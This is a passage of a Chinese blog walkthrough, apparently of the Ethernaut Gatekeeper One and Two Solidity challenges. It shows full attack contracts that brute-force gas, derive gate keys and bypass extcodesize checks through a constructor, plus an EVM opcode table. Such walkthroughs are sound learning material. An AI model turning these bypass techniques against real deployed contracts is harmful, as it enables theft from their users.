function\">encodeWithSignature</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"enter(bytes8)\"</span><span class=\"token punctuation\">,</span> key<span class=\"token punctuation\">)</span> <span class=\"token comment\">// You have the key from the previous section now</span>\n      <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>success<span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>        \n<span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>success<span class=\"token punctuation\">,</span> <span class=\"token string\">\"HACK FAILED\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">emit</span> <span class=\"token function\">Hacked</span><span class=\"token punctuation\">(</span>gasBrute<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// -&gt; This is the least value of `x`.</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>整合一下，攻击合约如下</p>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">contract</span> <span class=\"token class-name\">skipgate</span><span class=\"token punctuation\">{</span>\n  GatekeeperOne keykey<span class=\"token punctuation\">;</span>\n\n  <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n      keykey<span class=\"token operator\">=</span><span class=\"token function\">GatekeeperOne</span><span class=\"token punctuation\">(</span>_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n\n  <span class=\"token keyword\">function</span> <span class=\"token function\">attack</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span><span class=\"token punctuation\">{</span>\n    <span class=\"token builtin\">bytes8</span> _gateKey <span class=\"token operator\">=</span> <span class=\"token builtin\">bytes8</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint64</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint160</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span><span class=\"token number\">0xFFFFFFFF0000FFFF</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\t<span class=\"token comment\">//在这里要用uint160(msg.sender)，如果没有用uint160处理会报错说不能把address类型转为uint64</span>\n\n    <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> i<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;</span><span class=\"token number\">8191</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n       <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span> success<span class=\"token punctuation\">,</span><span class=\"token punctuation\">)</span><span class=\"token operator\">=</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span>keykey<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>call<span class=\"token punctuation\">{</span>gas<span class=\"token punctuation\">:</span> i <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span><span class=\"token number\">8191</span> <span class=\"token operator\">*</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">(</span>abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodeWithSignature</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"enter(bytes8)\"</span><span class=\"token punctuation\">,</span> _gateKey<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n           <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>success<span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>在本地测试时编译器一直崩溃，但是上链就行</p>\n<p><img src=\"https://s2.loli.net/2023/03/24/pgZEMPt35W8iqJz.png\" alt=\"image-20230205233516696.png\"></p>\n<h2 id=\"15-Gatekeeper-Two\"><a href=\"#15-Gatekeeper-Two\" class=\"headerlink\" title=\"15.Gatekeeper Two\"></a>15.Gatekeeper Two</h2><p>源码</p>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.8.0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">GatekeeperTwo</span> <span class=\"token punctuation\">{</span>\n\n  <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> entrant<span class=\"token punctuation\">;</span>\n\n  <span class=\"token keyword\">modifier</span> <span class=\"token function\">gateOne</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender <span class=\"token operator\">!=</span> tx<span class=\"token punctuation\">.</span>origin<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">_</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n\n  <span class=\"token keyword\">modifier</span> <span class=\"token function\">gateTwo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token builtin\">uint</span> x<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">assembly</span> <span class=\"token punctuation\">{</span> x <span class=\"token operator\">:=</span> <span class=\"token function\">extcodesize</span><span class=\"token punctuation\">(</span><span class=\"token function\">caller</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>x <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">_</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n\n  <span class=\"token keyword\">modifier</span> <span class=\"token function\">gateThree</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes8</span> _gateKey<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint64</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes8</span><span class=\"token punctuation\">(</span><span class=\"token function\">keccak256</span><span class=\"token punctuation\">(</span>abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodePacked</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token builtin\">uint64</span><span class=\"token punctuation\">(</span>_gateKey<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token function\">type</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint64</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>max<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">_</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n\n  <span class=\"token keyword\">function</span> <span class=\"token function\">enter</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes8</span> _gateKey<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> gateOne gateTwo <span class=\"token function\">gateThree</span><span class=\"token punctuation\">(</span>_gateKey<span class=\"token punctuation\">)</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    entrant <span class=\"token operator\">=</span> tx<span class=\"token punctuation\">.</span>origin<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>第一个修饰器和前一题是一样的，需要中间合约来调用函数</p>\n<p>第二个修饰器，先需要先学习以下内容</p>\n<h3 id=\"Assembly\"><a href=\"#Assembly\" class=\"headerlink\" title=\"Assembly\"></a><code>Assembly</code></h3><p>这是一个没见过的东西，摘自（<a href=\"https://docs.soliditylang.org/en/v0.4.23/assembly.html#）\">https://docs.soliditylang.org/en/v0.4.23/assembly.html#）</a></p>\n<ul>\n<li><code>Solidity Assembly</code>：Solidity 定义了一种汇编语言，也可以在没有 Solidity 的情况下使用。这种汇编语言也可以用作 Solidity 源代码中的“内联汇编”。<ul>\n<li><strong>句法</strong>：Assembly 完全像 Solidity 一样解析注释、文字和标识符，所以你可以使用通常的<code>//</code>和注释。内联汇编由这些花括号和里面的花括号标记，可以使用以下内容<code>/* */``assembly { ... }</code></li>\n</ul>\n</li>\n</ul>\n<p>补充操作码：</p>\n<div class=\"table-container\">\n<table>\n<thead>\n<tr>\n<th>操作说明</th>\n<th></th>\n<th></th>\n<th>解释</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>stop</td>\n<td>-</td>\n<td>F</td>\n<td>停止执行，等同于(0,0)</td>\n</tr>\n<tr>\n<td>add(x, y)</td>\n<td></td>\n<td>F</td>\n<td>x + y</td>\n</tr>\n<tr>\n<td>sub(x, y)</td>\n<td></td>\n<td>F</td>\n<td>x - y</td>\n</tr>\n<tr>\n<td>mul(x, y)</td>\n<td></td>\n<td>F</td>\n<td>x * y</td>\n</tr>\n<tr>\n<td>div(x, y)</td>\n<td></td>\n<td>F</td>\n<td>x / y</td>\n</tr>\n<tr>\n<td>sdiv(x, y)</td>\n<td></td>\n<td>F</td>\n<td>x / y, 对于二进制补码中的有符号数</td>\n</tr>\n<tr>\n<td>mod(x, y)</td>\n<td></td>\n<td>F</td>\n<td>x % y</td>\n</tr>\n<tr>\n<td>smod(x, y)</td>\n<td></td>\n<td>F</td>\n<td>x % y, 对于二进制补码中的有符号数</td>\n</tr>\n<tr>\n<td>exp(x, y)</td>\n<td></td>\n<td>F</td>\n<td>x 的 y 次方</td>\n</tr>\n<tr>\n<td>not(x)</td>\n<td></td>\n<td>F</td>\n<td>~x,  x 的每一位都取反</td>\n</tr>\n<tr>\n<td>lt(x, y)</td>\n<td></td>\n<td>F</td>\n<td>如果 x &lt; y 为 1，否则为 0</td>\n</tr>\n<tr>\n<td>gt(x, y)</td>\n<td></td>\n<td>F</td>\n<td>如果 x &gt; y 则为 1，否则为 0</td>\n</tr>\n<tr>\n<td>slt(x, y)</td>\n<td></td>\n<td>F</td>\n<td>如果 x &lt; y 则为 1，否则为 0，对于二进制补码中的有符号数</td>\n</tr>\n<tr>\n<td>sgt(x, y)</td>\n<td></td>\n<td>F</td>\n<td>如果 x &gt; y 则为 1，否则为 0，对于二进制补码中的有符号数</td>\n</tr>\n<tr>\n<td>eq(x, y)</td>\n<td></td>\n<td>F</td>\n<td>如果 x == y 则为 1，否则为 0</td>\n</tr>\n<tr>\n<td>iszero(x)</td>\n<td></td>\n<td>F</td>\n<td>如果 x == 0 则为 1，否则为 0</td>\n</tr>\n<tr>\n<td>and(x, y)</td>\n<td></td>\n<td>F</td>\n<td>x 和 y 的按位与</td>\n</tr>\n<tr>\n<td>or(x, y)</td>\n<td></td>\n<td>F</td>\n<td>x 和 y 的按位或</td>\n</tr>\n<tr>\n<td>xor(x, y)</td>\n<td></td>\n<td>F</td>\n<td>x 和 y 的按位异或</td>\n</tr>\n<tr>\n<td>byte(n, x)</td>\n<td></td>\n<td>F</td>\n<td>x 的第 n 个字节，其中最高有效字节是第 0 个字节</td>\n</tr>\n<tr>\n<td>shl(x, y)</td>\n<td></td>\n<td>C</td>\n<td>y 逻辑左移 x 位</td>\n</tr>\n<tr>\n<td>shr(x, y)</td>\n<td></td>\n<td>C</td>\n<td>y 逻辑右移 x 位</td>\n</tr>\n<tr>\n<td>sar(x, y)</td>\n<td></td>\n<td>C</td>\n<td>将 y 算术右移 x 位</td>\n</tr>\n<tr>\n<td>addmod(x, y, m)</td>\n<td></td>\n<td>F</td>\n<td>(x + y) % m 任意精度算术</td>\n</tr>\n<tr>\n<td>mulmod(x, y, m)</td>\n<td></td>\n<td>F</td>\n<td>(x * y) % m 任意精度算术</td>\n</tr>\n<tr>\n<td>signextend(i, x)</td>\n<td></td>\n<td>F</td>\n<td>符号从最低有效位起第 (i*8+7) 位扩展</td>\n</tr>\n<tr>\n<td>keccak256(p, n)</td>\n<td></td>\n<td>F</td>\n<td>keccak(mem[p…(p+n)))</td>\n</tr>\n<tr>\n<td>sha3(p, n)</td>\n<td></td>\n<td>F</td>\n<td>keccak(mem[p…(p+n)))</td>\n</tr>\n<tr>\n<td>jump(label)</td>\n<td>-</td>\n<td>F</td>\n<td>跳转到标签/代码位置</td>\n</tr>\n<tr>\n<td>jumpi(label, cond)</td>\n<td>-</td>\n<td>F</td>\n<td>如果 cond 非零则跳转到标签</td>\n</tr>\n<tr>\n<td>pc</td>\n<td></td>\n<td>F</td>\n<td>当前在代码中的位置</td>\n</tr>\n<tr>\n<td>pop(x)</td>\n<td>-</td>\n<td>F</td>\n<td>删除 x 推送的元素</td>\n</tr>\n<tr>\n<td>dup1 … dup16</td>\n<td></td>\n<td>F</td>\n<td>将第 i 个堆栈槽复制到顶部（从顶部开始计数）</td>\n</tr>\n<tr>\n<td>swap1 … swap16</td>\n<td>*</td>\n<td>F</td>\n<td>交换最顶层和它下面的第 i 个栈槽</td>\n</tr>\n<tr>\n<td>mload(p)</td>\n<td></td>\n<td>F</td>\n<td>内存[p..(p+32))</td>\n</tr>\n<tr>\n<td>mstore(p, v)</td>\n<td>-</td>\n<td>F</td>\n<td>内存[p..(p+32)) := v</td>\n</tr>\n<tr>\n<td>mstore8(p, v)</td>\n<td>-</td>\n<td>F</td>\n<td>mem[p] := v &amp; 0xff （只修改一个字节）</td>\n</tr>\n<tr>\n<td>sload(p)</td>\n<td></td>\n<td>F</td>\n<td>存储[p]</td>\n</tr>\n<tr>\n<td>sstore(p, v)</td>\n<td>-</td>\n<td>F</td>\n<td>存储[p] := v</td>\n</tr>\n<tr>\n<td>msize</td>\n<td></td>\n<td>F</td>\n<td>内存大小，即最大访问内存索引</td>\n</tr>\n<tr>\n<td>gas</td>\n<td></td>\n<td>F</td>\n<td>气体仍然可用于执行</td>\n</tr>\n<tr>\n<td>address</td>\n<td></td>\n<td>F</td>\n<td>当前合约/执行上下文的地址</td>\n</tr>\n<tr>\n<td>balance(a)</td>\n<td></td>\n<td>F</td>\n<td>地址a的wei余额</td>\n</tr>\n<tr>\n<td>caller</td>\n<td></td>\n<td>F</td>\n<td>呼叫发件人（不包括<code>delegatecall</code>）</td>\n</tr>\n<tr>\n<td>callvalue</td>\n<td></td>\n<td>F</td>\n<td>wei 与当前通话一起发送</td>\n</tr>\n<tr>\n<td>calldataload(p)</td>\n<td></td>\n<td>F</td>\n<td>从位置 p 开始调用数据（32 字节）</td>\n</tr>\n<tr>\n<td>calldatasize</td>\n<td></td>\n<td>F</td>\n<td>调用数据的大小（以字节为单位）</td>\n</tr>\n<tr>\n<td>calldatacopy(t, f, s)</td>\n<td>-</td>\n<td>F</td>\n<td>从位置 f 的 calldata 复制 s 个字节到位置 t 的内存</td>\n</tr>\n<tr>\n<td>codesize</td>\n<td></td>\n<td>F</td>\n<td>当前合约/执行上下文的代码大小</td>\n</tr>\n<tr>\n<td>codecopy(t, f, s)</td>\n<td>-</td>\n<td>F</td>\n<td>从位置 f 的代码复制 s 个字节到位置 t 的内存</td>\n</tr>\n<tr>\n<td>extcodesize(a)</td>\n<td></td>\n<td>F</td>\n<td>地址a处代码的大小</td>\n</tr>\n<tr>\n<td>extcodecopy(a, t, f, s)</td>\n<td>-</td>\n<td>F</td>\n<td>像 codecopy(t, f, s) 但在地址 a 处获取代码</td>\n</tr>\n<tr>\n<td>returndatasize</td>\n<td></td>\n<td>B</td>\n<td>最后返回数据的大小</td>\n</tr>\n<tr>\n<td>returndatacopy(t, f, s)</td>\n<td>-</td>\n<td>B</td>\n<td>将 s 个字节从位置 f 的 returndata 复制到位置 t 的 mem</td>\n</tr>\n<tr>\n<td>create(v, p, s)</td>\n<td></td>\n<td>F</td>\n<td>使用代码 mem[p..(p+s)) 创建新合约并发送 v wei 并返回新地址</td>\n</tr>\n<tr>\n<td>create2(v, n, p, s)</td>\n<td></td>\n<td>C</td>\n<td>使用代码 mem[p..(p+s)) 在地址 keccak256(<address> . n . keccak256(mem[p..(p+s))) 创建新合约并发送 v wei 并返回新地址</address></td>\n</tr>\n<tr>\n<td>call(g, a, v, in, insize, out, outsize)</td>\n<td></td>\n<td>F</td>\n<td>在地址 a 调用合约，输入 mem[in..(in+insize)) 提供 g gas 和 v wei 以及输出区域 mem[out..(out+outsize)) 错误返回 0（例如 out of gas）和1 成功</td>\n</tr>\n<tr>\n<td>callcode(g, a, v, in, insize, out, outsize)</td>\n<td></td>\n<td>F</td>\n<td>与 a相同<code>call</code>但仅使用 a 中的代码，否则留在当前合约的上下文中</td>\n</tr>\n<tr>\n<td>delegatecall(g, a, in, insize, out, outsize)</td>\n<td></td>\n<td>H</td>\n<td>相同<code>callcode</code>但也保持<code>caller</code> 和<code>callvalue</code></td>\n</tr>\n<tr>\n<td>staticcall(g, a, in, insize, out, outsize)</td>\n<td></td>\n<td>B</td>\n<td>相同但不允许状态修改<code>call(g, a, 0, in, insize, out, outsize)</code></td>\n</tr>\n<tr>\n<td>return(p, s)</td>\n<td>-</td>\n<td>F</td>\n<td>结束执行，返回数据 mem[p..(p+s))</td>\n</tr>\n<tr>\n<td>revert(p, s)</td>\n<td>-</td>\n<td>B</td>\n<td>结束执行，恢复状态变化，返回数据 mem[p..(p+s))</td>\n</tr>\n<tr>\n<td>selfdestruct(a)</td>\n<td>-</td>\n<td>F</td>\n<td>结束执行，销毁当前合约并将资金发送到</td>\n</tr>\n<tr>\n<td>invalid</td>\n<td>-</td>\n<td>F</td>\n<td>以无效指令结束执行</td>\n</tr>\n<tr>\n<td>log0(p, s)</td>\n<td>-</td>\n<td>F</td>\n<td>没有主题和数据的日志 mem[p..(p+s))</td>\n</tr>\n<tr>\n<td>log1(p, s, t1)</td>\n<td>-</td>\n<td>F</td>\n<td>记录主题 t1 和数据 mem[p..(p+s))</td>\n</tr>\n<tr>\n<td>log2(p, s, t1, t2)</td>\n<td>-</td>\n<td>F</td>\n<td>记录主题 t1、t2 和数据 mem[p..(p+s))</td>\n</tr>\n<tr>\n<td>log3(p, s, t1, t2, t3)</td>\n<td>-</td>\n<td>F</td>\n<td>记录主题 t1、t2、t3 和数据 mem[p..(p+s))</td>\n</tr>\n<tr>\n<td>log4(p, s, t1, t2, t3, t4)</td>\n<td>-</td>\n<td>F</td>\n<td>记录主题 t1、t2、t3、t4 和数据 mem[p..(p+s))</td>\n</tr>\n<tr>\n<td>origin</td>\n<td></td>\n<td>F</td>\n<td>交易发送方</td>\n</tr>\n<tr>\n<td>gasprice</td>\n<td></td>\n<td>F</td>\n<td>交易的gas价格</td>\n</tr>\n<tr>\n<td>blockhash(b)</td>\n<td></td>\n<td>F</td>\n<td>块 nr b 的哈希值 - 仅适用于除当前块之外的最后 256 个块</td>\n</tr>\n<tr>\n<td>coinbase</td>\n<td></td>\n<td>F</td>\n<td>当前采矿受益人</td>\n</tr>\n<tr>\n<td>timestamp</td>\n<td></td>\n<td>F</td>\n<td>当前块的时间戳，自纪元以来的秒数</td>\n</tr>\n<tr>\n<td>number</td>\n<td></td>\n<td>F</td>\n<td>当前区块号</td>\n</tr>\n<tr>\n<td>difficulty</td>\n<td></td>\n<td>F</td>\n<td>当前区块的难度</td>\n</tr>\n<tr>\n<td>gaslimit</td>\n<td></td>\n<td>F</td>\n<td>当前区块的区块gas limit</td>\n</tr>\n</tbody>\n</table>\n</div>\n<p>第二个修饰器</p>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">modifier</span> <span class=\"token function\">gateTwo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token builtin\">uint</span> x<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">assembly</span> <span class=\"token punctuation\">{</span> x <span class=\"token operator\">:=</span> <span class=\"token function\">extcodesize</span><span class=\"token punctuation\">(</span><span class=\"token function\">caller</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">}</span>\n  <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>x <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">_</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>extcodesize：</p>\n<p>在 Solidity 中，我们可以通过在 YUL 中使用汇编来使用低级代码。它们可以在内部使用<code>assembly {...}</code>。<code>extcodesize</code>就是这样一种操作码，它返回任何地址的代码大小。</p>\n<p>caller()：</p>\n<p>这是呼叫发送者的地址（delegatecall 除外）。</p>\n<p>在上面显示的修饰符中，变量<code>x</code>用于存储<code>caller()</code>地址上代码的大小，即调用 Gatekeeper Two 实例的合约。我们需要使用另一个合约来确保我们在第一个关口通过验证。</p>\n<p>正在检查该<code>x</code>变量以确保合约代码的大小为 0，换句话说，<a href=\"https://blog.solidityscan.com/distinguishing-eoa-and-smart-contracts-securely-911dc42fdf13\">EOA</a>应该进行调用而不是另一个合约。</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>注意：</p>\n<p>以太坊中，分为两种账户：</p>\n<ul>\n<li>外部账户：简称EOA，它拥有私钥，其codeHash为空</li>\n<li>合约账户：简称CA，它没有私钥，其codeHash非空<img src=\"https://s2.loli.net/2023/03/24/svmIjWNeRC27FDQ.png\" alt=\"image-20230206230024110.png\"></li>\n</ul></blockquote>\n<p>这是构造函数发挥作用的地方。在合约初始化期间，或<strong>调用其构造函数时，其运行时代码大小始终为 0</strong>。</p>\n<p>因此，当我们放置漏洞利用逻辑并从构造函数内部调用它时， <code>extcodesize</code> 的返回值将始终返回零。这实质上意味着我们所有的漏洞利用代码都将从我们合约的构造函数内部调用以通过第二道门。</p>\n<p>第三个修饰器</p>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">modifier</span> <span class=\"token function\">gateThree</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes8</span> _gateKey<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint64</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes8</span><span class=\"token punctuation\">(</span><span class=\"token function\">keccak256</span><span class=\"token punctuation\">(</span>abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodePacked</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token builtin\">uint64</span><span class=\"token punctuation\">(</span>_gateKey<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token function\">type</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint64</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>max<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">_</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<h3 id=\"XOR（按位异或）\"><a href=\"#XOR（按位异或）\" class=\"headerlink\" title=\"XOR（按位异或）\"></a><code>XOR</code>（按位异或）</h3><p><code>XOR</code>的符号是<code>^</code></p>\n<ul>\n<li>归零率：a ^ a = 0</li>\n<li>恒等率：a ^ 0 = a</li>\n<li>交换律：a ^ b = b ^ a</li>\n<li>结合律：a ^ b ^ c = a ^ ( b ^ c ) = ( a ^ b ) ^ c</li>\n<li>自反：a ^ b ^ a = b</li>\n<li>d = a ^ b ^ c 可以推出 a = d ^ b ^ c</li>\n<li>若x是二进制数0101，y是二进制数1011，则 x ^ y = 1110 ，只有在两个比较的位不同时结果是1，否则结果为0</li>\n</ul>\n<p>这是一个简单的 XOR 运算，我们知道它<code>A XOR B = C</code>等于<code>A XOR C = B</code>。<code>_gateKey</code>使用此逻辑，我们只需使用以下代码即可轻松找到未知数的值：</p>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token builtin\">bytes8</span> myKey <span class=\"token operator\">=</span> <span class=\"token builtin\">bytes8</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint64</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes8</span><span class=\"token punctuation\">(</span><span class=\"token function\">keccak256</span><span class=\"token punctuation\">(</span>abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodePacked</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token function\">type</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint64</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>max<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>攻击代码</p>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">contract</span> <span class=\"token class-name\">skipgate</span><span class=\"token punctuation\">{</span>\n  GatekeeperTwo keykey<span class=\"token punctuation\">;</span>\n\n  <span class=\"token 